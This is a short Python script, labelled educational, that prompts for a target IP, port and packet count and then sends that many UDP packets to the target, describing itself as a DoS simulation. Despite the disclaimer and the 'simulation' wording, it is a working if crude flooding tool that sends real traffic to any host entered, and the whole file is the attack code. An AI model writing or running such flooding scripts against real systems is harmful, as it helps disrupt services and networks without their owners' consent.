import socket
import time

# Educational disclaimer
print("This script is for educational purposes only.")
print("Do not use it without permission from the target.")
time.sleep(2)

target_ip = input("Enter target IP: ")
target_port = int(input("Enter target port: "))
num_packets = int(input("Enter number of packets: "))

# Warning prompt
print("\nWarning: Proceeding will simulate a DoS attack.")
proceed = input("Continue? (y/n): ")

if proceed.lower() == "y":
    try:
        for i in range(num_packets):
            # Create a socket object
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = b"Test packet"

            try:
                s.sendto(data, (target_ip, target_port))
                print(f"Sent packet {i+1} to {target_ip}:{target_port}")

            except socket.error as e:
                print(f"Packet {i+1} failed: {e}")

            finally:
                s.close()

        print("\nSimulation completed.")

    except KeyboardInterrupt:
        print("\nOperation cancelled by user.")

else:
    print("Operation aborted.")
